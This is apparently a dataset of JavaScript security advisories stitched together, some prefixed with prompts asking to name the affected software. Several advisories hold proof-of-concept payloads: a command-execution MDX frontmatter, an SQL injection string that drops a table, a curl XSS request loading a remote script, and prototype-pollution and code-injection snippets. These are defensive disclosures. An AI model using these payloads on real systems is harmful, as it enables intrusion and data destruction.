}\n}\n\nexport default async function handler(req, res) {\n  if (\n    req.query.callbackUrl &&\n    !isValidHttpUrl(req.query.callbackUrl)\n  ) {\n   return res.status(500).send('');\n  }\n  \n  return await NextAuth(req, res, /* your config */)\n}\n```\n\n\n### References\n\nThis vulnerability was discovered not long after https://github.com/nextauthjs/next-auth/security/advisories/GHSA-q2mx-j4x2-2h74 was published and is very similar in nature.\n\nRelated documentation:\n\n- https://next-auth.js.org/getting-started/client#specifying-a-callbackurl\n- https://next-auth.js.org/configuration/callbacks#redirect-callback\n\nA test case has been added so this kind of issue will be checked before publishing.

As a result, authentication could potentially be bypassed by making a fake certificate accessible via certain Apple domains and providing the URL to that certificate in an authData object.\n\n### Patches\nTo prevent this, a new `rootCertificateUrl` property is introduced to the Parse Server Apple Game Center auth adapter which takes the URL to the root certificate of Apple's Game Center authentication certificate. If no value is set, the `rootCertificateUrl` property defaults to the URL of the [current root certificate](https://developer.apple.com/news/?id=stttq465) as of May 27, 2022.\n\nKeep in mind that the root certificate can change at any time (expected to be announced by Apple) and that it is the developer's responsibility to keep the root certificate URL up-to-date when using the Parse Server Apple Game Center auth adapter.\n\n### Workarounds\nNone.\n\n### References\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-rh9j-f5f8-rvgc\n- https://developer.apple.com/news/?id=stttq465\n- https://github.com/parse-community/parse-server\n\n### More information\n* For questions or comments about this vulnerability visit our [community forum](http://community.parseplatform.org) or [community chat](http://chat.parseplatform.org)\n* Report other vulnerabilities at [report.parseplatform.org](https://report.parseplatform.org)\n\n.

Input: ### Impact\nThe gatsby-plugin-mdx plugin prior to versions 3.15.2 and 2.14.1 passes input through to the `gray-matter` npm package, which is vulnerable to JavaScript injection in its default configuration, unless input is sanitized.  The vulnerability is present when passing input in both webpack (MDX files in `src/pages` or MDX file imported as component in frontend / React code) and data mode (querying MDX nodes via GraphQL).  Injected JavaScript executes in the context of the build server.\n\nTo exploit this vulnerability untrusted/unsanitized input would need to be sourced or added into an MDX file.  The following MDX payload demonstrates a vulnerable configuration:\n```\n---js\n((require(\"child_process\")).execSync(\"id >> /tmp/rce\"))\n--- \n```\n\n### Patches\nA patch has been introduced in `gatsby-plugin-mdx@3.15.2` and `gatsby-plugin-mdx@2.14.1` which mitigates the issue by disabling the `gray-matter` JavaScript Frontmatter engine.  The patch introduces a new option, `JSFrontmatterEngine` which is set to `false` by default.  When setting `JSFrontmatterEngine` to `true`, input passed to `gatsby-plugin-mdx` must be sanitized before processing to avoid a security risk.  Warnings are displayed when enabling `JSFrontmatterEngine` to `true` or if it appears that the MDX input is attempting to use the Frontmatter engine.\n\n### Workarounds\nIf an older version of `gatsby-plugin-mdx` must be used, input passed into the plugin should be sanitized ahead of processing.\n\n**We encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.**\n\n### Credits\nWe would like to thank Snyk [snyk.io] for initially bringing the issue to our attention, as well as Feng Xiao and Zhongfu Su, who reported the issue to Snyk.\n\n### For more information\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).\n.

Input: ### Impact\nSQL Injection vulnerability in entities for applications generated with the option \"reactive with Spring WebFlux\" enabled and an SQL database using r2dbc. Applications created without \"reactive with Spring WebFlux\" and applications with NoSQL databases are not affected. \n\nIf you have generated a microservice Gateway using the affected version, you might be impacted as Gateways are reactive by default.\n\nCurrently, SQL injection is possible in the `findAllBy(Pageable pageable, Criteria criteria)` method of an entity repository class generated in these applications as the where clause using Criteria for queries are not sanitized and user input is passed on as it is by the criteria.\n\n## Impacted applications\n- Monolith and microservice applications with SQL database and reactive with Spring WebFlux combination (other combinations are not affected and the issue is only present when you generate entities)\n- Gateway applications with SQL database (issue will appear only when generating entities)\n\n### Patches\nPatched in v7.8.1\n\nThe `findAllBy(Pageable pageable, Criteria criteria)` method has been removed from the entity repositories and `org.springframework.data.relational.core.query.Criteria` support in the underlying methods has been replaced with `org.springframework.data.relational.core.sql.Condition`. This means you won't be able to do custom filtering in the generated applications.\n\nIf you have existing reactive applications generated by the impacted version, we advise you to audit for use of `Criteria` and take appropriate actions.\n\n### Workarounds\n\nThe problem lies in the `EntityManager.java` class when creating the where clause via `Conditions.just(criteria.toString())`.\n\n`just` accepts the literal string provided. Criteria's `toString` method returns a plain string and this combination is vulnerable to sql injection as the string is not sanitized and will contain whatever used passed as input using any plain SQL\n\nSo be careful when combining criterias and conditions. As a workaround we have removed the possibility to pass any user-provided criteria to the `createSelect` method of `EntityManager`.\n\n### Example \n\n```java\nCriteria criteria = Criteria.where(\"name\").is(\"foobar';DROP TABLE example;--\"); // parameter is user provided input\ncriteria.toString(); // --> \"'foobar';DROP TABLE example;--'\"\n```\n\n### References\n[More details in this Issue report](https://github.com/jhipster/generator-jhipster/issues/18269)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [JHipster issue tracker](https://github.com/jhipster/generator-jhipster/issues)\n.

Please identify the software name affected by it. Input: ### Impact\nThis is a Remote Code Execution (RCE) vulnerability in Parse Server. This vulnerability affects Parse Server in the default configuration with MongoDB. The main weakness that leads to RCE is the Prototype Pollution vulnerable code in the file `DatabaseController.js`, so it is likely to affect Postgres and any other database backend as well. This vulnerability has been confirmed on Linux (Ubuntu) and Windows.\n\n### Patches\nUpgrade to Parse Server >=4.10.7. If you are using a prerelease version of Parse Server 5.0 (alpha, beta) we will publish a timely fix for these. However, as a general reminder we do not consider prerelease versions to be suitable for production deployment.\n\nNote that as part of the fix a new security feature scans for sensitive keywords in request data to prevent JavaScript prototype pollution. If such a keyword is found, the request is rejected with HTTP response code `400` and Parse Error `105` (`INVALID_KEY_NAME`). By default these keywords are: `{_bsontype: \"Code\"}`, `constructor`, `__proto__`. If you are using any of these keywords in your request data, you can override the default keywords by setting the new Parse Server option `requestKeywordDenylist` to `[]` and specify your own keywords as needed.\n\n### Workarounds\nAlthough the fix is more broad and includes several aspects of the vulnerability, a quick and targeted fix can be achieved by patching the MongoDB Node.js driver and disable BSON code execution. To apply the patch, add the following code to be executed before starting Parse Server, for example in `index.js`.\n\n```\nconst BSON = require('bson');\n const internalDeserialize = BSON.prototype.deserialize;\n BSON.prototype.deserialize = (buffer, options = Object.create(null), ...others) => {\n   if (options.constructor) {\n     options = Object.assign(Object.create(null), options);\n   }\n   return internalDeserialize(buffer, options, ...others);\n };\n const internalDeserializeStream = BSON.prototype.deserializeStream;\n BSON.prototype.deserializeStream = (\n   data,\n   startIndex,\n   numberOfDocuments,\n   documents,\n   docStartIndex,\n   options = Object.create(null),\n   ...others\n ) => {\n   if (options.constructor) {\n     options = Object.assign(Object.create(null), options);\n   }\n   return internalDeserializeStream(\n     data,\n     startIndex,\n     numberOfDocuments,\n     documents,\n     docStartIndex,\n     options,\n     ...others\n   );\n };\n```\n\n### References\n- Original report on [huntr.dev](https://www.huntr.dev/bounties/ac24b343-e7da-4bc7-ab38-4f4f5cc9d099/)\n.

Input: ### Impact\n\nThe storage layout of the ERC2771ContextUpgradeable is not constant between versions. \n- versions `4.0.0`, `4.1.0` and `4.2.0`, the contract has a length of 51 slots. \n- since `4.3.0`, the contract has a length of 50 slots\n- future versions will continue using 50 slots. \n\nThis difference in layout could result in breaking upgrades if someone upgrades from an affected version to a non-affected version. It is thus recommended to be extremely careful when upgrading from a contract that uses ERC2771ContextUpgradeable `<4.3.0` to a newer version that uses `>=4.3.0`.\n\nWe've assessed the instances of this contract found on chain (with publicly verified source code) and notified the corresponding teams of the risk that an upgrade could cause.\n\n### Workarounds\n\nPotentially breaking upgrades would be caught by the OpenZeppelin Upgrades Plugins for Hardhat and Truffle. It is recommended to use this tooling for all your upgrades.\n\nIf you need to upgrade to a newer version of the Upgradeable Contracts library, we recommend copying the previous implementation ERC2771ContextUpgradeable (available in the `release-4.2` branch) and packaging it with your code.\n\n### Reference\n\nhttps://github.com/OpenZeppelin/openzeppelin-transpiler/pull/86\n\n### For more information\n\nIf you have any questions, comments, or need assistance regarding this advisory, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).\n\nTo submit security reports please use [our bug bounty on Immunefi](https://immunefi.com/bounty/openzeppelin/).\n.

A proven exploit for this vulnerability does not exist, since the exact requisites for it to happen have not been fully clarified, and the attempts to reproduce it under testing conditions have been unsuccessful, but it still can happen randomly and unintentionally in the wild. \n\n### Patches\nThe patch and fix is present in Volto 15.0.0-alpha.0 (or later). See PR: https://github.com/plone/volto/pull/3051.\nWe recommend upgrading to the final release of Volto 15 as soon as possible if running an affected version.\nSee the upgrade guide https://6-dev-docs.plone.org/volto/upgrade-guide/index.html#upgrading-to-volto-15-x-x\n\n### Workarounds\nIt is possible to create a fix by manually upgrading the react-cookie package to 4.1.1 and then overriding all Volto components that use this library as in https://github.com/plone/volto/pull/3051. As this is substantial work, an update to the Volto 15 is recommended. The upgrade steps for going from Volto 14 to Volto 15 are quite easy and do not involve any complexity.

Please identify the software name affected by it. Input: ### Impact\nThe [graphql-upload](https://www.npmjs.com/package/graphql-upload) npm package can execute GraphQL operations contained in `content-type: multipart/form-data` POST requests. Because they are POST requests, they can contain GraphQL mutations. Because they use `content-type: multipart/form-data`, they can be \"simple requests\" which are not preflighted by browsers.\n\nIf your GraphQL server uses `graphql-upload` and uses `SameSite=None` cookies for authentication, then JS on any origin can cause browsers to send cookie-authenticated mutations to your GraphQL server, which will be executed without checking your CORS policy first. (The attack won't be able to see the response to the mutation if your CORS policy is set up properly, but the side effects of the mutation will still happen.)\n\nAdditionally, if your GraphQL server uses `graphql-upload` and relies on network properties for security (whether by explicitly looking at the client's IP address or by only being available on a private network), then JS on any origin can cause browsers (which may be on a private network or have an allowed IP address) to send mutations to your GraphQL server, which will be executed without checking your CORS policy first. (This attack does not require your server to use cookies. It is in some cases prevented by some browsers such as Chrome.)\n\nApollo Server 2 bundled `graphql-upload` and enabled it by default, so by default, Apollo Server 2 servers are vulnerable to these CSRF attacks.  (Apollo Server 1 did not bundle `graphql-upload`. Apollo Server 3 no longer bundles `graphql-upload`, although AS3's docs do document how to manually integrate with `graphql-upload`.) It is enabled even if your server makes no use of the upload functionality.\n\nIf you are running Apollo Server 2 (older than v2.25.4) and do not specify `uploads: false` to `new ApolloServer`, then you are vulnerable to this CSRF mutation attack.\n\nWe recently introduced an opt-in CSRF prevention feature in Apollo Server 3.7.  This feature successfully protects against CSRF even if you have manually integrated your AS3.7 server with `graphql-upload`. However, this feature is not available for Apollo Server 2.\n\n### Patches\nIf you are using Apollo Server 2 and do *not* actually use uploads in your schema (ie, the `Upload` scalar is not used as the argument to any field or in any input object definition, and you do not specify `uploads` to `new ApolloServer`), then upgrading to Apollo Server 2.25.4 will automatically disable `graphql-upload` in your server.  This will fix the CSRF mutation vulnerability.\n\nUpgrading to v2.25.4 does still leave your server vulnerable to non-mutation CSRF attacks such as timing attacks against query operations. To protect yourself against these potentially lower impact CSRF attack, we encourage upgrading to Apollo Server v3.7 and enabling CSRF prevention. See [the Apollo Server 3 migration guide](https://www.apollographql.com/docs/apollo-server/migration/) and the [CSRF prevention docs](https://www.apollographql.com/docs/apollo-server/security/cors/#preventing-cross-site-request-forgery-csrf) for details.\n\nIf you are actively using the uploads feature with Apollo Server 2, then upgrading to v2.25.4 will not disable the feature and you will still be vulnerable. You should instead upgrade to v3.7 and enable the CSRF prevention feature.\n\nIf you are manually integrating the `graphql-upload` package with any version of Apollo Server (or any Node GraphQL server) and need to continue using the feature, then you must enable some sort of CSRF prevention feature to fix this vulnerability. We recommend the CSRF prevention feature in Apollo Server 3.7.\n\n### Workarounds\nInstead of upgrading your Apollo Server 2 server, you can specify `uploads: false` to `new ApolloServer` to disable the `graphql-upload` integration and protect against CSRF mutations. (Only do this if you do not actually use the uploads feature in your server!) This will still leave your server vulnerable to non-mutation CSRF attacks such as timing attacks against query operations; you need to upgrade to v3.7 and enable CSRF prevention to protect against these attacks.\n\n### Related work\n- [PR adding a Security section to the GraphQL multipart request spec](https://github.com/jaydenseric/graphql-multipart-request-spec/pull/64).

Please identify the software name affected by it. Input: ### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nIn Hardened JavaScript, programs can `harden` objects to safely share objects with co-tenant programs without risk of these other programs tampering with their API surface. Hardening does not guarantee that objects are pure or immutable, so a hardened `Map`, for example is superficially tamper-proof, but any party holding a reference to the object can both read and write its contents. Based on this precedent, and because `TypedArray` instances cannot be frozen with `Object.isFrozen`, `harden` does not `freeze` `TypedArrays` and instead makes them non-extensible and makes all non-indexed properties non-writable and non-configurable. This is consistent with the treatment of `Map` because the indexed properties represent mutable content and non-indexed properties represent the API.\n\nDue to a defect in `harden`, properties that have names that parse as numbers but are not the same as the canonical representation of those numbers, as in `\"+0\"` and `\"\"` which are both equivalent to their canonical number `\"0\"`,  remain writable after hardening.\n\nAny program treating one of these properties as part of its API and relying on `harden` to prevent modifications would be vulnerable to an API pollution attack, affecting only instances shared by mutually suspicious parties.\n\nUnlike a `Map`, a hardened `TypedArray` can only have numbers for content. Any program that is sharing hardened `TypedArrays` between co-tentant programs and relying on harden to only allow these programs to communicate exclusively by changing numbers within the bounds of the TypedArray, may inadvertently have arranged for a mechanism for a pair of third-parties to communicate arbitrary objects on these other properties.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nSES version 0.16.0 patches this issue, causing `harden` to recognize properties with non-canonical numeric representations and ensuring that these properties are non-configurable.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nUsers should avoid sharing `TypedArrays` between co-tenant programs and instead create wrapper objects that produce a read-only view of the underlying data. We allow `harden` to succeed for `TypedArrays` because the treatment is in fact consistent with the behavior of collections like `Map`, but all collections shared between co-tentant programs should probably be attenuated to either read- or write-only facets and probably close over only part of the content of the collection. However, the motivation for allowing `TypedArrays` to be hardened in practice is to allow certain legacy modules to function under Hardened JavaScript with LavaMoat, since they export `TypedArrays`, even though they would ideally export read-only facets of these.\n\n### References\n_Are there any links users can visit to find out more?_\n\nNot at this time.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@agoric.com](mailto:security@agoric.com)\n.

Input: ### Impact\n\nThe `GovernorCompatibilityBravo` module may lead to the creation of governance proposals that execute function calls with incorrect arguments due to bad ABI encoding. This happens if the proposal is created using explicit function signatures, e.g. a proposal to invoke the function `foo(uint256)` is created as `propose([target], [0], [\"foo(uint256)\"], [\"0x00..01\"])`. If the function selector is provided as part of the encoded proposal data the issue is not present, e.g. the same proposal is created as `propose([target], [0], [\"0x2fbebd3800..01\"])`, where `2fbebd38` is the function selector.\n\nWe've assessed the instances of this contract found on chain, and did not find any occurrence of this bug in the past. Proposal creation through Tally or OpenZeppelin Defender is not affected. The core `Governor` contract on its own is not affected.\n\n### Patches\n\nA fix is included in version v4.4.2 of `@openzeppelin/contracts` and `@openzeppelin/contracts-upgradeable`.\n\n### Workarounds\n\nDo not create proposals using explicit function signatures. Instead, use the `propose` function without the `signatures` argument, and create the proposal using the fully ABI-encoded function call including the function selector in the `calldatas` argument as explained above.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/issues/3099\n\n### Credits\n\nThis issue was identified and reported by @GeraldHost.\n\n### For more information\n\nIf you have any questions, comments, or need assistance regarding this advisory, email us at security@openzeppelin.com.\n\nTo submit security reports please use [our bug bounty on Immunefi](https://immunefi.com/bounty/openzeppelin/)..

Because the req.method did not match any common method VERB, connect answered with a 404 page containing the \"Cannot `[method]` `[url]`\" content. The method was not properly encoded for output in the browser.\n\n\n### Example:\n```\n~ curl \"localhost:3000\" -d \"_method=<script src=http://nodesecurity.io/xss.js></script>\"\nCannot <SCRIPT SRC=HTTP://NODESECURITY.IO/XSS.JS></SCRIPT> /\n```\n\n### Recommendation\n\nUpdate to the newest version of Connect or disable methodOverride. It is not possible to avoid the vulnerability if you have enabled this middleware in the top of your stack.\n\n### Credit:\nSergio Arcos. Top 1 search result is npm:connect.

Input: ### Overview\nPrototype pollution vulnerability in 'keyget' versions 1.0.0 through 2.2.0 allows attacker to cause a denial of service and may lead to remote code execution.\n\n### Details\nThe npm module 'keyget' can be abused by Prototype Pollution vulnerability since the function 'setByPath()' did not check for the type of object before assigning value to the property. Due to this flaw an attacker could create a non-existent property or able to manipulate the property which leads to Denial of Service or potentially Remote code execution.\n\n### PoC Details\nThe `setByPath()` function accepts three arguments `target, path, value`. Due to the absence of validation, at values passed into `path, value` an attacker can supply a malicious value by adjusting the `path` value to include the `__proto__` property. Since there is no validation before assigning property to check whether the assigned `path` is the Object's own property or not, the property `polluted` will be directly be assigned to the empty obj({}) thereby polluting the Object prototype. Later in the code, if there is a check to validate `polluted` the value would be substituted as \"true\" as it had been polluted.\n\n### PoC Code\n```js\nvar keyget = require(\"keyget\")\n keyget.set({}, '__proto__.polluted', 'true');\n console.log(polluted); \n```.

Input: ### Impact\n\nPossible consensus split given maliciously-crafted `AttesterSlashing` or `ProposerSlashing` being included on-chain.\n\nSince we represent `uint64` values as native javascript `number`s, there is an issue when those variables with large (greater than 2^53) `uint64` values are included on chain. In those cases, Lodestar may view _valid_ `AttesterSlashing` or `ProposerSlashing` as _invalid_, due to rounding errors in large `number` values. This causes a consensus split, where Lodestar nodes are forked away from the main network.\n\nSimilarly Lodestar may consider _invalid_ `ProposerSlashing` as _valid_, thus including in proposed blocks that will be considered invalid by the network.\n\n### Patches\n\nhttps://github.com/ChainSafe/lodestar/pull/3977\n\n### Workarounds\n\nUse `BigInt` to represent `Slot` and `Epoch` values in `AttesterSlashing` and `ProposerSlashing` objects. `BigInt` is too slow to be used in all `Slot` and `Epoch` cases, so we will carefully use `BigInt` just where necessary for consensus..

Input: ### Impact\n\nWe found that this vulnerability is present when the developer is implementing an OAuth 1 provider (by extension, it means Twitter, which is the only built-in provider using OAuth 1), but **upgrading** is **still recommended**.\n\n`next-auth` v3 users before version 3.29.3 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our [migration guide](https://next-auth.js.org/getting-started/upgrade-v4))\n\n`next-auth` v4 users before version 4.3.3 are impacted.\n\n### Patches\n\nWe've released patches for this vulnerability in:\n  \n- v3 - `3.29.3`\n- v4 - `4.3.3`\n\nYou can do:\n\n```sh\nnpm i next-auth@latest\n```\n\nor\n\n```sh\nyarn add next-auth@latest\n```\n\nor\n\n```sh\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change  `latest` to `3` if you want to stay on v3.)\n\n### Workarounds\n\nIf you are not able to upgrade for any reason, you can add the following configuration to your `callbacks` option:\n\n```ts\n// async redirect(url, baseUrl) { // v3\nasync redirect({ url, baseUrl }) { // v4\n    // Allows relative callback URLs\n    if (url.startsWith(\"/\")) return `${baseUrl}${url}`\n    // Allows callback URLs on the same origin\n    else if (new URL(url).origin === baseUrl) return url\n    return baseUrl\n}\n```\n\n### References\n\nThis vulnerability was discovered right after https://github.com/nextauthjs/next-auth/security/advisories/GHSA-f9wg-5f46-cjmw was published and is very similar in nature.\n\nRead more about the `callbacks.redirect` option in the documentation: https://next-auth.js.org/configuration/callbacks#redirect-callback\n\n### For more information\n\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\n\nThe issue was reported 2022 April 20th, a response was sent out to the reporter 8 minutes after, and a patch was produced within a few days..

Input: ### Overview\nPrototype pollution vulnerability in 'changeset' versions 0.0.1 through 0.2.5 allows attackers to cause a denial of service and may lead to remote code execution.\n\n### Details\nThe npm module 'changeset' can be abused by Prototype Pollution vulnerability since the function 'apply()' does not check for the type of object before assigning value to the property. Due to this flaw an attacker could create a non-existent property or able to manipulate the property which leads to Denial of Service or potentially Remote code execution.\n\n### PoC Details\nThe 'apply()' function accepts 'changes, target, modify' as argument. Due to the absence of validation on the values passed into the 'changes' argument, an attacker can supply a malicious value by adjusting the value to include the '__proto__' property. Since there is no validation before assigning the property to check whether the assigned argument is the Object's own property or not, the property 'polluted' will be directly be assigned to the new object thereby polluting the Object prototype. Using the example below, if there is a check to validate 'polluted' the valued later in the code, it would be substituted as \"Yes! Its Polluted\" as it had been polluted.\n\n### PoC Code\n\n```js\nvar changeset = require(\"changeset\") const patch = [{\n    type: 'put',\n    key: [\"__proto__\", \"polluted\"],\n    value: \"Yes! Its Polluted\"\n}];\nconsole.log(\"Before : \" + {}.polluted);\nchangeset.apply(patch, {}, true);\nconsole.log(\"After : \" + {}.polluted);\n```. Top 1 search result is npm:changeset.

Input: A vulnerability in the Cisco node-jose open source library before 0.11.0 could allow an unauthenticated, remote attacker to re-sign tokens using a key that is embedded within the token. The vulnerability is due to node-jose following the JSON Web Signature (JWS) standard for JSON Web Tokens (JWTs).

Input: The `parse` method of the JSON5 library before and including version `2.2.1` does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object.\n\nThis vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations.\n\n## Impact\nThis vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution.\n\n## Mitigation\nThis vulnerability is patched in json5 v2.2.2 and later. A patch has also been backported for json5 v1 in versions v1.0.2 and later.\n\n## Details\n \nSuppose a developer wants to allow users and admins to perform some risky operation, but they want to restrict what non-admins can do. To accomplish this, they accept a JSON blob from the user, parse it using `JSON5.parse`, confirm that the provided data does not set some sensitive keys, and then performs the risky operation using the validated data:\n \n```js\nconst JSON5 = require('json5');\n\nconst doSomethingDangerous = (props) => {\n  if (props.isAdmin) {\n    console.log('Doing dangerous thing as admin.');\n  } else {\n    console.log('Doing dangerous thing as user.');\n  }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n  let searchKeyFound = false;\n  Object.keys(obj).forEach((key) => {\n    if (searchKeys.indexOf(key) > -1) {\n      searchKeyFound = true;\n    }\n  });\n  return searchKeyFound;\n};\n\nconst props = JSON5.parse('{\"foo\": \"bar\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"Doing dangerous thing as user.\"\n} else {\n  throw new Error('Forbidden...');\n}\n```\n \nIf the user attempts to set the `isAdmin` key, their request will be rejected:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"isAdmin\": true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props);\n} else {\n  throw new Error('Forbidden...'); // Error: Forbidden...\n}\n```\n \nHowever, users can instead set the `__proto__` key to `{\"isAdmin\": true}`. `JSON5` will parse this key and will set the `isAdmin` key on the prototype of the returned object, allowing the user to bypass the security check and run their request as an admin:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"__proto__\": {\"isAdmin\": true}}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); // \"Doing dangerous thing as admin.\"\n} else {\n  throw new Error('Forbidden...');\n}\n ```.

Input: ### Impact\nAll authenticated Cube clients could bypass row-level security and run arbitrary SQL via the newly introduced /v1/sql-runner endpoint.\n\n### Patches\nThe change has been reverted in 0.31.24\n\n### Workarounds\nUpgrade to >=0.31.24 or downgrade to <=0.31.22\n\n### Post mortem\nAs part of implementing the Cube Cloud SQL runner functionality, we\u2019ve added a new endpoint to the Cube Core so that we could add arbitrary queries directly to the queue, bypassing the modeling layer.\n\nThe endpoint was added in this commit: https://github.com/cube-js/cube.js/commit/f1e25bb50323c0b99f3891d349467e7b637baeea\n\nIt went through the code review; however, it slipped everyone\u2019s attention that this endpoint completely bypasses any row-level security logic implemented in the modeling layer. Now anyone with a valid Cube JWT token could fetch any data, even if they were not allowed to do so by their security context.\n\nThe issue was noticed by the Core team on Dec 12 and immediately reverted.\n\nThe just-released 0.31.23 version of the Cube has been pulled out of all the registries, and a CVE was published on Github.\nAnother change (https://github.com/cube-js/cube.js/commit/2c5db32f2ded074ebe5e83668eee8c024101240b) was also rolled back along with the SQL runner endpoint. It didn't pose a significant security threat, but it increased the attacker\u2019s ability to enumerate cube schema, and it should be revisited.\n\nThe 0.31.24 was released to replace the revoked version with a change completely reverted.

Please identify the software name affected by it. Input: ### Impact\nVersions older than `v0.38.0` of js-libp2p are vulnerable to targeted resource exhaustion attacks. These attacks target libp2p\u2019s connection, stream, peer, and memory management. An attacker can cause the allocation of large amounts of memory, ultimately leading to the process getting killed by the host\u2019s operating system. While a connection manager tasked with keeping the number of connections within manageable limits has been part of js-libp2p, this component was designed to handle the regular churn of peers, not a targeted resource exhaustion attack.\n\n### Patches (What to do as a js-libp2p consumer:)\nUpdate your js-libp2p dependency to `v0.38.0` or greater.\n\n### Workarounds\nThere are no workarounds, and so we recommend to upgrade your js-libp2p version.\nSome range of attacks can be mitigated using OS tools (like manually blocking malicious peers using iptables or ufw ) or making use of a load balancer in front of libp2p nodes.\nYou can also use the [allow deny list in js-libp2p](https://docs.libp2p.io/concepts/security/dos-mitigation/#deny-specific-peers-or-create-an-allow-list-of-trusted-peers) to deny specific peers.\n\nHowever these require direct action & responsibility on your part and are no substitutes for upgrading js-libp2p. Therefore, we highly recommend upgrading your js-libp2p version for the way it enables tighter scoped limits and provides visibility into and easier reasoning about js-libp2p resource utilization.\n\n### References\n* DoS Mitigation page for more information on how to incorporate mitigation strategies, monitor your application, and respond to attacks: https://docs.libp2p.io/reference/dos-mitigation/. \n* Documentation on how to configure limits to prevent excessive resource consumption: https://github.com/libp2p/js-libp2p/blob/master/doc/LIMITS.md\n* Documentation on how to configure metrics: https://github.com/libp2p/js-libp2p/blob/master/doc/METRICS.md\n\nPlease see the related disclosure for go-libp2p: https://github.com/libp2p/go-libp2p/security/advisories/GHSA-j7qp-mfxf-8xjw and rust-libp2p: https://github.com/libp2p/rust-libp2p/security/advisories/GHSA-jvgw-gccv-q5p8 \n\n#### For more information\n\nIf you have any questions or comments about this advisory, please email us at [security@libp2p.io](mailto:security@libp2p.io)..

This could be used for other private data, if the malicious user knew what was set as private for specific routes.\n\n\n## Recommendation\n\nVersion 2.x: Update to version 2.5.0 or later.\nVersion 3.x: Update to version 3.1.0 or later..

I am using a JSON Schema here for simplicity.\n```ts\nconst jsonSchemaDoc = {\n  $id: 'CustomClass',\n  type: 'object',\n  properties: {\n      'property: any; \\n constructor(){console.log(\"injected\")} \\n private _temp': { type: 'string' },\n  }\n};\ngenerator = new TypeScriptGenerator(\n  { \n    presets: [\n      {\n        class: {\n            property({ propertyName, content }) {\n              return `private ${propertyName}: any;`;\n            },\n            ctor() {\n              return '';\n            },\n            getter() {\n              return '';\n            },\n            setter() {\n              return '';\n            }\n        }\n      }\n    ]\n  }\n);\nconst inputModel = await generator.process(jsonSchemaDoc);\n```\nThis would render\n```ts\nexport class CustomClass {\n  private property: any; \n   constructor(){console.log(\"injected\")} \n   private _temp: any;\n  private additionalProperties: any;\n}\n```.

There is a corresponding `graphql-playground` [advisory](https://github.com/graphql/graphql-playground/security/advisories/GHSA-59r9-6jp6-jcm7) and [Apollo Server advisory](https://github.com/apollographql/apollo-server/security/advisories/GHSA-qm7x-rc44-rrqw).\n\n## 1. Impact\n\nAll versions of `graphiql` older than [`graphiql@1.4.7`](https://github.com/graphql/graphiql/releases/tag/v1.4.7) are vulnerable to compromised HTTP schema introspection responses or `schema` prop values with malicious GraphQL type names, exposing a dynamic XSS attack surface that can allow code injection on operation autocomplete.\n\nIn order for the attack to take place, the user must load a vulnerable schema in `graphiql`. There are a number of ways that can occur.\n\nBy default, the schema URL is _not_ attacker-controllable in `graphiql` or in its suggested implementations or examples, leaving only very complex attack vectors.\n\nIf a custom implementation of `graphiql`'s `fetcher` allows the schema URL to be set dynamically, such as a URL query parameter like `?endpoint=` in `graphql-playground`, or a database provided value, then this custom `graphiql` implementation is _vulnerable to phishing attacks_, and thus much more readily available, low or no privelege level xss attacks. The URLs could look like any generic looking graphql schema URL.\n\nBecause this exposes an XSS attack surface, it would be possible for a threat actor to exfiltrate user credentials, data, etc. using arbitrary malicious scripts, without it being known to the user.\n\n## 2. Scope\n\nThis advisory describes the impact on the `graphiql` package. The vulnerability also affects other projects forked from `graphiql` such as [`graphql-playground`](https://github.com/graphql/graphql-playground/security/advisories/GHSA-59r9-6jp6-jcm7) and the `graphql-playground` fork distributed by Apollo Server. The impact is more severe in the `graphql-playground` implementations; see the [`graphql-playground` advisory](https://github.com/graphql/graphql-playground/security/advisories/GHSA-59r9-6jp6-jcm7) and [Apollo Server advisory](https://github.com/apollographql/apollo-server/security/advisories/GHSA-qm7x-rc44-rrqw) for details.\n\nThis vulnerability does not impact `codemirror-graphql`, `monaco-graphql` or other dependents, as it exists in `onHasCompletion.ts` in `graphiql`. It does impact all forks of `graphiql`, and every released version of `graphiql`.\n\nIt should be noted that desktop clients such as Altair, Insomnia, Postwoman, do not appear to be impacted by this.\n\n## 3. Patches\n\n`graphiql@1.4.7` addresses this issue via defense in depth.\n\n- **HTML-escaping text** that should be treated as text rather than HTML. In most of the app, this happens automatically because React escapes all interpolated text by default. However, one vulnerable component uses the unsafe `innerHTML` API and interpolated type names directly into HTML. We now properly escape that type name, which fixes the known vulnerability.\n\n- **Validates the schema** upon receiving the introspection response or schema changes. Schemas with names that violate the GraphQL spec will no longer be loaded. (This includes preventing the Doc Explorer from loading.) This change is also sufficient to fix the known vulnerability. You can disable this validation by setting `dangerouslyAssumeSchemaIsValid={true}`, which means you are relying only on escaping values to protect you from this attack.\n\n- **Ensuring that user-generated HTML is safe**. Schemas can contain Markdown in `description` and `deprecationReason` fields, and the web app renders them to HTML using the `markdown-it` library. As part of the development of 